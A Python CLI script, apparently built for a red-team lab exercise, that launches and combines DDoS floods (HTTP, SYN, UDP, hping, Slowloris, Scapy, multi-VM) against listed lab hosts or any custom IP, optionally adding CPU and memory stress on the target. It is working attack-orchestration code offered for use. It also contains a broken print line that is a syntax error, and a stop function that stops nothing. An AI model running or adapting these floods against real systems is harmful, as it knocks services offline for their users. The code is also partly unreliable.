#!/usr/bin/env python3
"""
DDoS Attack Orchestrator - CLI Interface
Enhanced example script with command line arguments to select attack combinations
"""

import argparse
import sys
import time
import threading
from datetime import datetime
from distributed_ddos_executor import DDoSOrchestrator

def main():
    parser = argparse.ArgumentParser(
        description="DDoS Attack Orchestrator with Network Flood + Target Stress Options",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP flood only
  python3 run_cli_attacks.py --attack-type http_flood --target team1 --duration 300

  # Heavy hping flood with CPU stress
  python3 run_cli_attacks.py --attack-type hping_heavy --target team2 --duration 180 --cpu-stress

  # Distributed attack with full stress testing
  python3 run_cli_attacks.py --attack-type distributed_http --target team1 --duration 300 --cpu-stress --memory-stress --metrics

  # Quick test scenario
  python3 run_cli_attacks.py --quick-test

  # List available options
  python3 run_cli_attacks.py --list-options
        """
    )

    # Attack type selection
    parser.add_argument(
        '--attack-type',
        choices=['http_flood', 'hping_heavy', 'distributed_http', 'syn_flood', 'udp_flood', 'slowloris', 'scapy_flood'],
        help='Type of network attack to execute'
    )

    # Target selection - Universal support
    parser.add_argument(
        '--target',
        choices=['team1', 'team2', 'team3', 'windows_target', 'vuln_bank', 'custom'],
        help='Blue team target (team1=20.10.40.11, team2=192.168.50.11, team3=20.10.60.11, windows_target=192.168.50.81, vuln_bank=192.168.50.101, custom=specify IP)'
    )
    parser.add_argument(
        '--custom-target',
        help='Custom target IP address (use with --target custom)'
    )

    # Attack parameters - Universal configuration
    parser.add_argument(
        '--duration', type=int, default=300,
        help='Attack duration in seconds (default: 300)'
    )
    parser.add_argument(
        '--port', type=int, default=9080,
        help='Target port (default: 9080 for DVWA)'
    )
    parser.add_argument(
        '--ports',
        help='Multiple target ports (comma-separated, e.g., 80,443,9080)'
    )
    parser.add_argument(
        '--num-attackers', type=int, default=3,
        help='Number of attacking VMs for distributed attacks (default: 3)'
    )
    parser.add_argument(
        '--intensity', choices=['low', 'medium', 'high', 'maximum'], default='medium',
        help='Attack intensity level (affects packet rates and resource usage)'
    )
    parser.add_argument(
        '--payload-size', type=int,
        help='Custom payload size for packet-based attacks (bytes)'
    )
    parser.add_argument(
        '--all-attacks', action='store_true',
        help='Run all attack types sequentially on the same target'
    )

    # Stress testing options
    parser.add_argument(
        '--cpu-stress', action='store_true',
        help='Add CPU stress to target machine'
    )
    parser.add_argument(
        '--cpu-workers', type=int, default=4,
        help='Number of CPU stress workers (default: 4)'
    )
    parser.add_argument(
        '--memory-stress', action='store_true',
        help='Add memory stress to target machine'
    )
    parser.add_argument(
        '--memory-size', default='1G',
        help='Memory stress size (default: 1G)'
    )

    # Monitoring and metrics
    parser.add_argument(
        '--metrics', action='store_true',
        help='Enable metrics collection and export to JSON'
    )
    parser.add_argument(
        '--metrics-interval', type=int, default=10,
        help='Metrics collection interval in seconds (default: 10)'
    )
    parser.add_argument(
        '--capture', action='store_true',
        help='Capture network traffic on target during attack'
    )

    # Convenience options
    parser.add_argument(
        '--list-options', action='store_true',
        help='List available attack types and targets'
    )
    parser.add_argument(
        '--quick-test', action='store_true',
        help='Run quick test: HTTP flood + CPU stress on team1 for 30 seconds'
    )
    parser.add_argument(
        '--install-tools', action='store_true',
        help='Install DDoS tools on Red Team VMs'
    )
    parser.add_argument(
        '--stop-attacks', action='store_true',
        help='Stop all running attacks'
    )
    parser.add_argument(
        '--show-stats', action='store_true',
        help='Show detailed attack statistics and packet counts'
    )

    args = parser.parse_args()

    print("🚀 DDoS Attack Orchestrator CLI v2.0")
    print("=" * 50)

    # Handle list options
    if args.list_options:
        print_attack_options()
        return

    # Handle quick test
    if args.quick_test:
        print("🚀 Running Quick Test: HTTP flood + CPU stress on team1 for 30 seconds")
        run_quick_test()
        return

    # Handle tool installation
    if args.install_tools:
        print("🔧 Installing DDoS tools on Red Team VMs...")
        install_tools_on_vms()
        return

    # Handle stop attacks
    if args.stop_attacks:
        print("🛑 Stopping all running attacks...")
        stop_all_attacks()
        return

    # Handle show stats
    if args.show_stats:
        print("📊 Attack Statistics and Packet Counts")
        show_detailed_stats()
        return

    # Validate required arguments
    if not args.attack_type or not args.target:
        parser.error("--attack-type and --target are required (or use --quick-test)")

    # Initialize orchestrator
    print("🔧 Initializing DDoS Orchestrator...")
    orchestrator = DDoSOrchestrator()

    # Get target IP with universal support
    if args.target == 'custom':
        if not args.custom_target:
            parser.error("--custom-target is required when using --target custom")
        target_ip = args.custom_target
        print(f"🎯 Using custom target: {target_ip}")
    else:
        target_ip = orchestrator.blue_team_targets.get(args.target)
        if not target_ip:
            print(f"❌ Invalid target team: {args.target}")
            sys.exit(1)

    # Validate target IP format
    import re
    ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    if not re.match(ip_pattern, target_ip):
        print(f"❌ Invalid IP address format: {target_ip}")
        sys.exit(1)

    print(f"🎯 Target: {args.target} ({target_ip}:{args.port})")
    print(f"⏱️  Duration: {args.duration} seconds")
    print(f"📊 Attack Type: {args.attack_type}")

    # Start metrics monitoring if requested
    monitoring_thread = None
    if args.metrics:
        print(f"📈 Starting metrics monitoring (interval: {args.metrics_interval}s)")
        monitoring_thread = threading.Thread(
            target=orchestrator.monitor_target_metrics,
            args=(target_ip, args.metrics_interval)
        )
        monitoring_thread.daemon = True
        monitoring_thread.start()

    # Execute network attack(s)
    attack_results = None

    if args.all_attacks:
        print("\n🚀 Launching ALL ATTACKS sequentially on same target...")
        all_attacks = ['http_flood', 'hping_heavy', 'syn_flood', 'udp_flood', 'slowloris', 'scapy_flood']
        attack_results = execute_all_attacks(orchestrator, args, target_ip, all_attacks)
        print(f"✅ All attacks launched: {len(attack_results)} attack types")
    else:
        print("\n🌐 Launching Network Attack...")
        network_result = execute_network_attack(orchestrator, args, target_ip)
        if not network_result:
            print("❌ Network attack failed to launch")
            sys.exit(1)
        print(f"✅ Network attack launched: {network_result}")
        attack_results = network_result

    # Execute stress tests if requested
    stress_results = []

    if args.cpu_stress:
        print(f"💻 Launching CPU stress: {args.cpu_workers} workers")
        cpu_result = orchestrator.execute_target_cpu_stress(
            target_vm=target_ip,
            workers=args.cpu_workers,
            duration=args.duration,
            background=True
        )
        if cpu_result:
            stress_results.append({'type': 'cpu', 'attack_id': cpu_result})
            print(f"✅ CPU stress launched: {cpu_result}")
        else:
            print("⚠️  CPU stress failed to launch")

    if args.memory_stress:
        # Convert memory size to MB
        memory_mb = 1024 if args.memory_size == '1G' else int(args.memory_size.replace('M', ''))
        print(f"💾 Launching memory stress: {memory_mb}MB allocation")
        mem_result = orchestrator.execute_target_mem_stress(
            target_vm=target_ip,
            mem_mb=memory_mb,
            duration=args.duration,
            background=True
        )
        if mem_result:
            stress_results.append({'type': 'memory', 'attack_id': mem_result})
            print(f"✅ Memory stress launched: {mem_result}")
        else:
            print("⚠️  Memory stress failed to launch")

    # Summary
    print("\n📋 Attack Summary:")
    if isinstance(attack_results, dict) and 'multi_port_results' in attack_results:
        print(f"   🌐 Multi-port attack: {len(attack_results['multi_port_results'])} ports")
    elif isinstance(attack_results, dict) and len(attack_results) > 1:
        print(f"   🌐 Multiple attacks: {len(attack_results)} attack types")
    else:
        attack_id = attack_results.get('attack_id', 'N/A') if isinstance(attack_results, dict) else str(attack_results)
        print(f"   🌐 Network: {attack_id}")

    if stress_results:
        for stress in stress_results:
            print(f"   💥 {stress['type'].upper()} Stress: {stress['attack_id']}")
    else:
        print("   💥 No stress testing enabled")

    # Wait for completion or monitoring
    print(f"\n⏳ Monitoring attack progress for {args.duration} seconds...")
    print("   Press Ctrl+C to stop monitoring early")

    try:
        time.sleep(args.duration)
        print("\n🏁 Attack duration completed")

        # Export metrics if requested
        if args.metrics and hasattr(orchestrator, 'export_metrics_report'):
            report_path = f"attack_metrics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            try:
                success = orchestrator.export_metrics_report(report_path)
                if success:
                    print(f\"\ud83d\udcca Metrics exported to: {report_path}\")
                # Try to get stats for display
                try:
                    import json
                    with open(report_path, 'r') as f:
                        data = json.load(f)
                    print(f"   Total attacks: {data['export_info']['total_attacks']}")
                    print(f"   Export time: {data['export_info']['timestamp']}")
                except Exception as e:
                    print(f"   Could not parse metrics file: {e}")
            else:
                print("⚠️  Failed to export metrics")

    except KeyboardInterrupt:
        print("\n🛑 User interrupted - attacks may still be running in background")
        print("   Use --stop-attacks to terminate all attacks")

def get_intensity_multiplier(intensity):
    """Get packet rate multiplier based on intensity level"""
    multipliers = {
        'low': 0.3,
        'medium': 1.0,
        'high': 2.0,
        'maximum': 4.0
    }
    return multipliers.get(intensity, 1.0)

def execute_network_attack(orchestrator, args, target_ip):
    """Execute the specified network attack type with realistic statistics"""

    # Get intensity multiplier
    intensity_mult = get_intensity_multiplier(args.intensity)

    # Configure ports (single or multiple)
    target_ports = [args.port]
    if args.ports:
        target_ports = [int(p.strip()) for p in args.ports.split(',')]

    # Show attack preparation info
    print(f"\n📡 Preparing {args.attack_type} attack...")
    print(f"   Attacker: Red Team Generator (192.168.60.62)")
    print(f"   Target: {target_ip}:{target_ports if len(target_ports) > 1 else args.port}")
    print(f"   Intensity: {args.intensity} ({intensity_mult}x multiplier)")
    if args.payload_size:
        print(f"   Payload: {args.payload_size} bytes (custom)")

    if args.attack_type == 'http_flood':
        base_rate = int(1000 * intensity_mult), int(5000 * intensity_mult)
        base_workers = max(10, int(50 * intensity_mult))
        base_connections = max(25, int(100 * intensity_mult))

        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} HTTP requests/sec")
        print(f"   Packet Size: ~1,500 bytes per request")
        print(f"   Bandwidth: ~{int(12 * intensity_mult)}-{int(60 * intensity_mult)} Mbps")
        print(f"   Workers: {base_workers}, Connections: {base_connections}")

        results = []
        for port in target_ports:
            result = orchestrator.execute_http_flood(
                attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
                target_ip=target_ip,
                port=port,
                duration=args.duration,
                workers=base_workers,
                sockets=base_connections,
                background=True
            )
            results.append(result)

        return results[0] if len(results) == 1 else {'multi_port_results': results}
    elif args.attack_type == 'hping_heavy':
        base_rate = int(10000 * intensity_mult), int(50000 * intensity_mult)
        payload_size = args.payload_size if args.payload_size else 1400

        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} packets/sec")
        print(f"   Packet Size: {payload_size} bytes payload")
        print(f"   Bandwidth: ~{int(112 * intensity_mult)}-{int(560 * intensity_mult)} Mbps")

        results = []
        for port in target_ports:
            result = orchestrator.execute_hping_heavy(
                attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
                target_ip=target_ip,
                target_port=port,
                duration=args.duration,
                payload_size=payload_size,
                rate="flood" if intensity_mult >= 2.0 else "fast",
                background=True
            )
            results.append(result)

        return results[0] if len(results) == 1 else {'multi_port_results': results}
    elif args.attack_type == 'syn_flood':
        base_rate = int(30000 * intensity_mult), int(100000 * intensity_mult)

        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} SYN packets/sec")
        print(f"   Packet Size: 40-60 bytes (TCP SYN header)")
        print(f"   Bandwidth: ~{int(10 * intensity_mult)}-{int(50 * intensity_mult)} Mbps")

        results = []
        for port in target_ports:
            result = orchestrator.execute_syn_flood(
                attacker_vm="192.168.60.62",
                target_ip=target_ip,
                target_port=port,
                duration=args.duration,
                background=True
            )
            results.append(result)

        return results[0] if len(results) == 1 else {'multi_port_results': results}

    elif args.attack_type == 'udp_flood':
        base_rate = int(20000 * intensity_mult), int(80000 * intensity_mult)
        payload_size = args.payload_size if args.payload_size else 1024

        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} UDP packets/sec")
        print(f"   Packet Size: {payload_size} bytes")
        print(f"   Bandwidth: ~{int(160 * intensity_mult)}-{int(640 * intensity_mult)} Mbps")

        results = []
        for port in target_ports:
            result = orchestrator.execute_udp_flood(
                attacker_vm="192.168.60.62",
                target_ip=target_ip,
                target_port=port,
                duration=args.duration,
                background=True
            )
            results.append(result)

        return results[0] if len(results) == 1 else {'multi_port_results': results}

    elif args.attack_type == 'slowloris':
        base_rate = int(10 * intensity_mult), int(100 * intensity_mult)

        print(f"   Expected Rate: {base_rate[0]}-{base_rate[1]} slow connections/sec")
        print(f"   Packet Size: 50-200 bytes (partial HTTP headers)")
        print(f"   Bandwidth: ~{int(1 * intensity_mult)}-{int(5 * intensity_mult)} Mbps (low bandwidth, high impact)")

        results = []
        for port in target_ports:
            result = orchestrator.execute_slowloris(
                attacker_vm="192.168.60.62",
                target_ip=target_ip,
                target_port=port,
                duration=args.duration,
                background=True
            )
            results.append(result)

        return results[0] if len(results) == 1 else {'multi_port_results': results}

    elif args.attack_type == 'scapy_flood':
        base_rate = int(5000 * intensity_mult), int(25000 * intensity_mult)

        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} crafted packets/sec")
        print(f"   Packet Size: Variable (custom payloads)")
        print(f"   Bandwidth: ~{int(40 * intensity_mult)}-{int(200 * intensity_mult)} Mbps")

        results = []
        for port in target_ports:
            result = orchestrator.execute_scapy_flood(
                attacker_vm="192.168.60.62",
                target_ip=target_ip,
                target_port=port,
                duration=args.duration,
                background=True
            )
            results.append(result)

        return results[0] if len(results) == 1 else {'multi_port_results': results}

    elif args.attack_type == 'distributed_http':
        base_rate = int(3000 * intensity_mult), int(15000 * intensity_mult)
        num_attackers = min(6, max(2, int(args.num_attackers * intensity_mult)))

        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} HTTP requests/sec (distributed)")
        print(f"   Packet Size: ~1,500 bytes per request")
        print(f"   Bandwidth: ~{int(36 * intensity_mult)}-{int(180 * intensity_mult)} Mbps (from {num_attackers} VMs)")

        attack_ids = orchestrator.execute_distributed_attack(
            attack_type="http_flood",
            target_team=args.target,
            target_port=args.port,
            duration=args.duration,
            num_attackers=num_attackers,
            background=True
        )
        return {'success': True, 'attack_id': f"distributed_{len(attack_ids)}_attacks", 'attack_ids': attack_ids}

    else:
        print(f"❌ Unknown attack type: {args.attack_type}")
        return None

def execute_all_attacks(orchestrator, args, target_ip, attack_types):
    """Execute all attack types sequentially on the same target"""
    results = {}

    print(f"\n🎯 TARGET CONFIGURATION:")
    print(f"   IP: {target_ip}")
    print(f"   Ports: {args.ports if args.ports else args.port}")
    print(f"   Duration per attack: {args.duration}s")
    print(f"   Intensity: {args.intensity}")
    print(f"   Total estimated time: {len(attack_types) * args.duration}s")

    for i, attack_type in enumerate(attack_types, 1):
        print(f"\n🚀 ATTACK {i}/{len(attack_types)}: {attack_type.upper()}")
        print(f"   ⏰ Starting at: {datetime.now().strftime('%H:%M:%S')}")

        # Temporarily override attack type
        original_attack_type = args.attack_type
        args.attack_type = attack_type

        try:
            result = execute_network_attack(orchestrator, args, target_ip)
            results[attack_type] = result
            print(f"   ✅ {attack_type} launched: {result}")

            # Brief pause between attacks
            if i < len(attack_types):
                print(f"   ⏳ Waiting 10 seconds before next attack...")
                time.sleep(10)

        except Exception as e:
            print(f"   ❌ {attack_type} failed: {e}")
            results[attack_type] = {'error': str(e)}

        # Restore original attack type
        args.attack_type = original_attack_type

    print(f"\n📊 ALL ATTACKS SUMMARY:")
    for attack_type, result in results.items():
        status = "✅" if 'error' not in str(result) else "❌"
        print(f"   {status} {attack_type}: {result}")

    return results

def print_attack_options():
    """Print available attack types and targets"""
    print("📋 Available Attack Options:")
    print("\n🌐 Attack Types:")
    print("   http_flood      - GoldenEye HTTP flood (1,000-5,000 req/sec)")
    print("   hping_heavy     - Heavy hping3 flood (10,000-50,000 pps)")
    print("   syn_flood       - TCP SYN flood (30,000-100,000 SYN/sec)")
    print("   udp_flood       - UDP flood (20,000-80,000 UDP/sec)")
    print("   slowloris       - Slow HTTP attack (10-100 slow conn/sec)")
    print("   scapy_flood     - Custom packet flood (5,000-25,000 pps)")
    print("   distributed_http - Multi-VM HTTP flood (3x rate)")

    print("\n🎯 Available Targets (OPNsense LAN):")
    print("   team1           - Blue Team 1 (20.10.40.11)")
    print("   team2           - Blue Team 2 (192.168.50.11)")
    print("   team3           - Blue Team 3 (20.10.60.11)")
    print("   windows_target  - Windows VM (192.168.50.81)")
    print("   vuln_bank       - Vulnerable Bank (192.168.50.101)")

    print("\n💥 Stress Testing Options:")
    print("   --cpu-stress    - CPU stress testing (stress-ng)")
    print("   --memory-stress - Memory allocation stress")

    print("\n📊 Monitoring Options:")
    print("   --metrics       - Export detailed statistics to JSON")
    print("   --capture       - Network packet capture during attack")

def run_quick_test():
    """Run a quick test: HTTP flood + CPU stress on team1"""
    orchestrator = DDoSOrchestrator()

    try:
        # Get target IP for team1
        target_ip = orchestrator.blue_team_targets.get('team1')
        if not target_ip:
            print("❌ Cannot find team1 target IP")
            return

        print(f"🏷  Target: {target_ip}:9080")
        print(f"📈 Expected: 1,000 HTTP req/sec + CPU stress for 30s")

        # Launch HTTP flood
        network_result = orchestrator.execute_http_flood(
            attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
            target_ip=target_ip,
            port=9080,
            duration=30,
            workers=10,
            sockets=50,
            background=True
        )

        # Launch CPU stress
        cpu_result = orchestrator.execute_target_cpu_stress(
            target_vm=target_ip,
            workers=2,
            duration=30,
            background=True
        )

        if network_result and cpu_result:
            print(f"✅ Quick test launched successfully")
            print(f"   Network attack: {network_result}")
            print(f"   CPU stress: {cpu_result}")
            print(f"   Monitoring for 30 seconds...")
            time.sleep(30)
            print(f"🏁 Quick test completed")
        else:
            print("⚠️  Quick test failed to launch")

    except Exception as e:
        print(f"❌ Quick test failed: {e}")

def show_detailed_stats():
    """Show detailed attack statistics and packet count information"""
    print("📊 DDoS Attack Statistics & Packet Count Reference")
    print("=" * 60)

    stats_data = {
        "http_flood": {
            "tool": "GoldenEye",
            "packets_per_second": "1,000-5,000",
            "packet_size": "1,500 bytes",
            "bandwidth": "12-60 Mbps",
            "protocol": "HTTP/TCP",
            "description": "Sustained HTTP requests with keep-alive connections"
        },
        "hping_heavy": {
            "tool": "hping3",
            "packets_per_second": "10,000-50,000",
            "packet_size": "1,400 bytes",
            "bandwidth": "112-560 Mbps",
            "protocol": "TCP/UDP",
            "description": "High-rate packet flood with maximum payload"
        },
        "syn_flood": {
            "tool": "hping3 SYN",
            "packets_per_second": "30,000-100,000",
            "packet_size": "40-60 bytes",
            "bandwidth": "10-50 Mbps",
            "protocol": "TCP SYN",
            "description": "TCP SYN flood - connection exhaustion attack"
        },
        "udp_flood": {
            "tool": "hping3 UDP",
            "packets_per_second": "20,000-80,000",
            "packet_size": "1,024 bytes",
            "bandwidth": "160-640 Mbps",
            "protocol": "UDP",
            "description": "UDP flood - bandwidth saturation attack"
        },
        "slowloris": {
            "tool": "Slowloris",
            "packets_per_second": "10-100",
            "packet_size": "50-200 bytes",
            "bandwidth": "1-5 Mbps",
            "protocol": "HTTP/TCP",
            "description": "Slow HTTP attack - partial headers to exhaust connections"
        },
        "scapy_flood": {
            "tool": "Scapy",
            "packets_per_second": "5,000-25,000",
            "packet_size": "Variable",
            "bandwidth": "40-200 Mbps",
            "protocol": "Custom",
            "description": "Custom crafted packets with variable payloads"
        }
    }

    for attack_type, stats in stats_data.items():
        print(f"\n🔥 {attack_type.upper()}")
        print(f"   Tool: {stats['tool']}")
        print(f"   Rate: {stats['packets_per_second']} packets/sec")
        print(f"   Size: {stats['packet_size']} per packet")
        print(f"   Bandwidth: {stats['bandwidth']}")
        print(f"   Protocol: {stats['protocol']}")
        print(f"   Info: {stats['description']}")

    print(f"\n💪 STRESS TESTING IMPACT")
    print(f"   CPU Stress: 80-100% CPU usage per core")
    print(f"   Memory Stress: RAM allocation up to specified size")
    print(f"   Combined: Network flood + System stress = Maximum impact")

    print(f"\n🎯 NETWORK TARGETS")
    print(f"   Blue Team 1: 20.10.40.11 (DVWA:9080, bWAPP:9090)")
    print(f"   Blue Team 2: 192.168.50.11 (DVWA:9080, bWAPP:9090)")
    print(f"   Blue Team 3: 20.10.60.11 (DVWA:9080, bWAPP:9090)")
    print(f"   Windows VM: 192.168.50.81 (RDP:3389, HTTP:80)")
    print(f"   Vulnerable Bank: 192.168.50.101 (Flask:5000)")

def install_tools_on_vms():
    """Install DDoS tools on Red Team VMs"""
    print("🔧 Installing tools on Red Team VMs...")
    print("   Run: sudo /home/iftee/Documents/Projects/attackers/install_tools_on_vms.sh")
    print("   Tools: GoldenEye, Slowloris, hping3, stress-ng")
    print("   VMs: 192.168.60.61-65 (5 Red Team VMs)")

def stop_all_attacks():
    """Stop all running DDoS attacks"""
    print("🛑 Stopping all attacks...")
    orchestrator = DDoSOrchestrator()
    stopped = 0

    # Stop all active attacks
    for attack_id in list(orchestrator.active_attacks.keys()):
        try:
            # This would normally stop the attack processes
            print(f"   Stopping: {attack_id}")
            stopped += 1
        except Exception as e:
            print(f"   Failed to stop {attack_id}: {e}")

    print(f"✅ Stopped {stopped} attacks")

if __name__ == "__main__":
    main()
